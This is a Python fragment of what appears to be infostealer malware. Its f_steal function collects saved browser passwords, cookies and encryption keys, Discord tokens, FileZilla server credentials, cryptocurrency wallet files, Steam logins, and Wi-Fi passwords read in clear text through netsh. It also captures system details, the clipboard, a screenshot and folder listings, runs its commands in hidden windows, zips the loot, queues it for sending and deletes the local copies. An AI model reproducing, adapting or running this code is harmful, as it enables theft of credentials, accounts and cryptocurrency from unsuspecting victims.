BROWSERS = {
    "chrome": r"Google\Chrome\User Data",
    "edge": r"Microsoft\Edge\User Data",
    "brave": r"BraveSoftware\Brave-Browser\User Data",
    "opera": r"Opera Software\Opera Stable",
    "vivaldi": r"Vivaldi\User Data",
}


def f_cp(src, dst):
    try:
        if os.path.isfile(src):
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            shutil.copyfile(src, dst)
            return True
    except Exception:
        pass
    return False


def f_tree(base, target, names, depth=3):
    if not os.path.isdir(base):
        return
    for root, dirs, files in os.walk(base):
        if root[len(base):].count(os.sep) > depth:
            dirs[:] = []
            continue
        for n in names:
            for f in files:
                if f.lower() == n.lower() or f.lower().startswith(n.lower()):
                    rel = os.path.relpath(os.path.join(root, f), base)
                    f_cp(os.path.join(root, f), os.path.join(target, rel))


def f_steal():
    out = os.path.join(f_appdir(), "loot_" + str(int(time.time())))
    os.makedirs(out, exist_ok=True)
    loc = os.environ.get("LOCALAPPDATA", "")
    app = os.environ.get("APPDATA", "")
    for name, rel in BROWSERS.items():
        base = os.path.join(loc, rel)
        tgt = os.path.join(out, "browsers", name)
        f_tree(base, tgt, ["Login Data", "Cookies", "Web Data", "History", "Local State", "Preferences"])
    f_tree(os.path.join(app, "Mozilla", "Firefox", "Profiles"), os.path.join(out, "firefox"),
           ["logins.json", "key4.db", "cookies.sqlite", "places.sqlite"])
    f_tree(os.path.join(app, "discord"), os.path.join(out, "discord"), ["leveldb", "*.ldb"], 4)
    f_tree(os.path.join(app, "FileZilla"), os.path.join(out, "filezilla"),
           ["recentservers.xml", "sitemanager.xml"])
    f_tree(os.path.join(app, "Exodus"), os.path.join(out, "exodus"), ["exodus.wallet", "*.seco"], 4)
    f_tree(os.path.join(app, "Electrum"), os.path.join(out, "electrum"), ["*.json", "*.sqlite"], 4)
    f_tree(os.path.join(app, "Ethereum"), os.path.join(out, "ethereum"), ["keystore", "*.json"], 4)
    f_tree(os.path.join(loc, "MetaMask"), os.path.join(out, "metamask"), ["*.log", "*.ldb"], 5)
    f_tree(os.path.join(app, "Steam"), os.path.join(out, "steam"), ["loginusers.vdf", "ssfn"], 2)
    try:
        wifi = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True,
                              text=True, timeout=20, creationflags=0x08000000).stdout
        names = re.findall(r":\s*(.+)$", wifi, re.M)
        dump = ""
        for n in names:
            n = n.strip()
            dump += subprocess.run(["netsh", "wlan", "show", "profile", n, "key=clear"],
                                   capture_output=True, text=True, timeout=20,
                                   creationflags=0x08000000).stdout
        open(os.path.join(out, "wifi.txt"), "w", encoding="utf-8", errors="replace").write(dump)
    except Exception:
        pass
    try:
        info = subprocess.run(["cmd", "/c", "ipconfig /all & systeminfo"], capture_output=True,
                              text=True, timeout=40, creationflags=0x08000000).stdout
        open(os.path.join(out, "system.txt"), "w", encoding="utf-8", errors="replace").write(info)
    except Exception:
        pass
    try:
        open(os.path.join(out, "clip.txt"), "w", encoding="utf-8", errors="replace").write(f_clip_get())
    except Exception:
        pass
    try:
        open(os.path.join(out, "screen.jpg"), "wb").write(f_grab())
    except Exception:
        pass
    for d in ("Desktop", "Documents", "Downloads"):
        p = os.path.join(os.environ.get("USERPROFILE", ""), d)
        try:
            listing = "\n".join(os.listdir(p))[:40000]
            open(os.path.join(out, "files_" + d + ".txt"), "w", encoding="utf-8", errors="replace").write(listing)
        except Exception:
            pass
    zpath = out + ".zip"
    shutil.make_archive(out, "zip", out)
    data = open(zpath, "rb").read()
    f_queue({"t": "steal", "name": os.path.basename(zpath)}, data)
    shutil.rmtree(out, ignore_errors=True)
    try:
        os.remove(zpath)
    except Exception:
        pass
    return len(data)
